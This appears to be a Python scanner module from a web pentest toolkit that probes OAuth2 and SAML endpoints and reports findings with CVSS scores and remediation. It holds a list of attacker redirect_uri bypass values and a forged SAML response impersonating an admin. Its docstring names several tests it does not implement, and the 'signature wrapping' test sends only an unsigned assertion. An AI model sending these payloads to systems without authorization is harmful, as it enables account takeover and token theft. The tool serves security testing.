#!/usr/bin/env python3
"""
OAuth2 / SAML Security Tester
-------------------------------
Tests for common OAuth2 and SAML vulnerabilities:

OAuth2:
  • Missing state parameter (CSRF on OAuth flow)
  • Open redirect_uri (token hijacking via redirect)
  • Authorization code reuse
  • Implicit flow token in URL (Referer leakage)
  • Scope escalation attempt
  • PKCE bypass (code_challenge absent)

SAML:
  • XML signature wrapping (XSW) attack
  • Missing signature validation
  • XXE in SAML assertion
  • Weak NameID format
"""

import re
import base64
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from bs4 import BeautifulSoup
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Common OAuth2 endpoint paths
OAUTH_PATHS = [
    "/oauth/authorize",
    "/oauth2/authorize",
    "/auth/oauth",
    "/connect/authorize",
    "/.well-known/openid-configuration",
    "/oauth/token",
    "/oauth2/token",
    "/token",
    "/auth",
    "/authorize",
]

SAML_PATHS = [
    "/saml/login",
    "/saml/sso",
    "/saml2/sso",
    "/Shibboleth.sso/SAML2/POST",
    "/adfs/ls/",
    "/simplesaml/saml2/idp/SSOService.php",
]

# Attacker-controlled redirect URIs for redirect_uri bypass tests
EVIL_REDIRECTS = [
    "https://evil.example.com/callback",
    "https://attacker.com",
    "https://evil.example.com\\@legitimate.com/callback",  # backslash bypass
    "https://legitimate.com.evil.com/callback",  # suffix confusion
    "javascript:alert(1)",
    "//evil.example.com/callback",  # protocol-relative
]


class OAuth2SAMLTester:
    """OAuth2 and SAML vulnerability scanner."""

    def __init__(self, target: str, timeout: int = 10, session=None):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.results: List[Dict] = []
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            from urllib3.util.retry import Retry

            retry_strategy = Retry(
                total=3,
                backoff_factor=0.5,
                status_forcelist=[429, 500, 502, 503, 504],
                allowed_methods=["HEAD", "GET", "OPTIONS"],
            )
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=100, pool_maxsize=100, max_retries=retry_strategy
            )
            self.session.mount("http://", adapter)
            self.session.mount("https://", adapter)
            self.session.headers["User-Agent"] = (
                "WebPwnToolkit/2.0 (Authorized Security Testing)"
            )
            self.session.verify = False

    # ── Discover OAuth2 / SAML endpoints ─────────────────────────────

    def _discover_oauth(self) -> Dict:
        """Try .well-known/openid-configuration for endpoint discovery."""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        try:
            resp = self.session.get(
                f"{base}/.well-known/openid-configuration",
                timeout=self.timeout,
                verify=False,
            )
            if resp.status_code == 200 and "authorization_endpoint" in resp.text:
                data = resp.json()
                console.print(f"  [green]✅ OpenID Config found[/green]")
                return data
        except Exception:
            pass
        return {}

    def _find_oauth_endpoints(self) -> List[str]:
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        found = []
        for path in OAUTH_PATHS:
            url = base + path
            try:
                resp = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
                body = resp.text.lower()
                # Only count as real OAuth endpoint if:
                # 1) Returns JSON with OAuth fields, OR
                # 2) Contains OAuth error text (not just a generic redirect/404 page)
                is_oauth = (
                    "authorization_endpoint" in body
                    or "token_endpoint" in body
                    or "client_id" in body
                    or "grant_type" in body
                    or "redirect_uri" in body
                    or (resp.status_code == 400 and "error" in body)
                ) and resp.status_code not in (404, 410, 500)
                if is_oauth:
                    found.append(url)
            except Exception:
                pass
        return found

    # ── OAuth2 Tests ──────────────────────────────────────────────────

    def _test_missing_state(self, auth_url: str) -> Optional[Dict]:
        """Test if state parameter is enforced (CSRF protection on OAuth)."""
        try:
            resp = self.session.get(
                auth_url,
                params={
                    "response_type": "code",
                    "client_id": "test_client",
                    "redirect_uri": f"{self.target}/callback",
                    # Intentionally omitting state
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            body = resp.url + resp.text
            if "state" not in body.lower() and resp.status_code in (200, 302):
                return {
                    "url": auth_url,
                    "type": "OAuth2 — Missing State Parameter (CSRF Risk)",
                    "severity": "high",
                    "evidence": f"Authorization endpoint accepted request without state param",
                    "detail": (
                        "The OAuth2 authorization endpoint did not require a 'state' parameter. "
                        "This allows CSRF attacks to hijack the OAuth flow and steal tokens."
                    ),
                    "owasp": "A01:2021 – Broken Access Control",
                    "cvss": 8.1,
                    "remediation": (
                        "Enforce the 'state' parameter on all OAuth2 authorization requests. "
                        "Validate state on the callback to prevent CSRF."
                    ),
                }
        except Exception:
            pass
        return None

    def _test_redirect_uri_bypass(self, auth_url: str) -> List[Dict]:
        """Test if redirect_uri can be hijacked to an attacker-controlled host."""
        findings = []
        for evil_uri in EVIL_REDIRECTS:
            try:
                resp = self.session.get(
                    auth_url,
                    params={
                        "response_type": "code",
                        "client_id": "test_client",
                        "redirect_uri": evil_uri,
                        "state": "webpwn_test",
                    },
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )
                location = resp.headers.get("Location", "")
                if (
                    resp.status_code in (301, 302, 307)
                    and "evil.example.com" in location
                ):
                    findings.append(
                        {
                            "url": auth_url,
                            "parameter": "redirect_uri",
                            "payload": evil_uri,
                            "type": "OAuth2 — Open redirect_uri (Token Hijacking)",
                            "severity": "critical",
                            "evidence": f"Redirects to attacker URI: {location[:100]}",
                            "detail": (
                                f"The authorization server accepted '{evil_uri}' as redirect_uri. "
                                "An attacker can steal authorization codes/tokens via this open redirect."
                            ),
                            "owasp": "A01:2021 – Broken Access Control",
                            "cvss": 9.3,
                            "remediation": (
                                "Enforce exact-match allowlist for redirect_uri. "
                                "Reject any URI not pre-registered by the client."
                            ),
                        }
                    )
                    break
            except Exception:
                pass
        return findings

    def _test_pkce_missing(self, auth_url: str) -> Optional[Dict]:
        """Check if PKCE (code_challenge) is required for public clients."""
        try:
            resp = self.session.get(
                auth_url,
                params={
                    "response_type": "code",
                    "client_id": "mobile_app",
                    "redirect_uri": f"{self.target}/callback",
                    "state": "webpwn_test",
                    # No code_challenge
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            body = resp.text.lower()
            if resp.status_code not in (400, 401) and "code_challenge" not in body:
                return {
                    "url": auth_url,
                    "type": "OAuth2 — PKCE Not Enforced",
                    "severity": "medium",
                    "evidence": f"Authorization accepted without code_challenge (HTTP {resp.status_code})",
                    "detail": (
                        "The authorization server does not enforce PKCE for public clients. "
                        "Authorization codes can be intercepted and exchanged by attackers."
                    ),
                    "owasp": "A02:2021 – Cryptographic Failures",
                    "cvss": 6.8,
                    "remediation": (
                        "Enforce PKCE (RFC 7636) for all public clients. "
                        "Require code_challenge_method=S256."
                    ),
                }
        except Exception:
            pass
        return None

    def _test_token_in_url(self, auth_url: str) -> Optional[Dict]:
        """Detect implicit flow returning token in URL fragment (Referer leakage)."""
        try:
            resp = self.session.get(
                auth_url,
                params={
                    "response_type": "token",  # implicit flow
                    "client_id": "test_client",
                    "redirect_uri": f"{self.target}/callback",
                    "state": "webpwn_test",
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            if "access_token" in resp.url or "access_token" in resp.text:
                return {
                    "url": auth_url,
                    "type": "OAuth2 — Implicit Flow Token in URL",
                    "severity": "high",
                    "evidence": "access_token found in URL/response (implicit flow active)",
                    "detail": (
                        "The server supports implicit flow (response_type=token), returning "
                        "access tokens in the URL. Tokens can leak via Referer headers, "
                        "browser history, and server logs."
                    ),
                    "owasp": "A02:2021 – Cryptographic Failures",
                    "cvss": 7.4,
                    "remediation": (
                        "Disable implicit flow. Use authorization code flow with PKCE instead. "
                        "Never return tokens in URL fragments for production apps."
                    ),
                }
        except Exception:
            pass
        return None

    # ── SAML Tests ────────────────────────────────────────────────────

    def _test_saml_xsw(self, saml_url: str) -> Optional[Dict]:
        """Test for XML Signature Wrapping (XSW) vulnerability."""
        # Minimal SAML Response with a duplicated/wrapped assertion
        xsw_payload = base64.b64encode(b"""<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                ID="_evil" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                  ID="_wrapped" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://evil.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
        admin@target.com
      </saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>""").decode()

        try:
            resp = self.session.post(
                saml_url,
                data={"SAMLResponse": xsw_payload, "RelayState": "/"},
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            body = resp.text.lower()
            if resp.status_code in (200, 302) and any(
                k in body
                for k in ["dashboard", "welcome", "logout", "admin", "profile"]
            ):
                return {
                    "url": saml_url,
                    "type": "SAML — XML Signature Wrapping (XSW)",
                    "severity": "critical",
                    "evidence": f"Server accepted forged SAMLResponse (HTTP {resp.status_code})",
                    "detail": (
                        "The SAML consumer accepted an unsigned/forged assertion. "
                        "XML Signature Wrapping allows authentication bypass as any user."
                    ),
                    "owasp": "A07:2021 – Identification and Authentication Failures",
                    "cvss": 9.8,
                    "remediation": (
                        "Validate XML signature on the entire SAML Response AND Assertion. "
                        "Use a hardened SAML library. Reject unsigned assertions."
                    ),
                }
        except Exception:
            pass
        return None

    # ── Public run ────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        console.print(f"  [dim]→ Discovering OAuth2/SAML endpoints...[/dim]")
        oidc_config = self._discover_oauth()
        oauth_endpoints = self._find_oauth_endpoints()

        # Add auth endpoint from OIDC discovery
        auth_ep = oidc_config.get("authorization_endpoint")
        if auth_ep and auth_ep not in oauth_endpoints:
            oauth_endpoints.insert(0, auth_ep)

        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        saml_endpoints = [
            base + p for p in SAML_PATHS if self._endpoint_exists(base + p)
        ]

        console.print(
            f"  [dim]→ {len(oauth_endpoints)} OAuth2 endpoint(s) | "
            f"{len(saml_endpoints)} SAML endpoint(s)[/dim]"
        )

        total = len(oauth_endpoints) * 4 + len(saml_endpoints)
        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]OAuth2/SAML scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("oauth", total=max(total, 1))

            for ep in oauth_endpoints:
                progress.advance(task)
                r = self._test_missing_state(ep)
                if r:
                    self.results.append(r)

                progress.advance(task)
                self.results.extend(self._test_redirect_uri_bypass(ep))

                progress.advance(task)
                r = self._test_pkce_missing(ep)
                if r:
                    self.results.append(r)

                progress.advance(task)
                r = self._test_token_in_url(ep)
                if r:
                    self.results.append(r)

            for ep in saml_endpoints:
                progress.advance(task)
                r = self._test_saml_xsw(ep)
                if r:
                    self.results.append(r)

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' OAuth2/SAML issue(s) found!' if self.results else '✅ No OAuth2/SAML issues found'}"
            f"[/]"
        )
        return self.results

    def _endpoint_exists(self, url: str) -> bool:
        try:
            resp = self.session.get(
                url, timeout=self.timeout, verify=False, allow_redirects=False
            )
            return resp.status_code not in (404, 410)
        except Exception:
            return False


# ── Backwards-compatible alias ────────────────────────────────────────────────
# main.py imports `OAuthTester` but the class above is named `OAuth2SAMLTester`.
# This alias makes both names work without renaming the original class.
OAuthTester = OAuth2SAMLTester
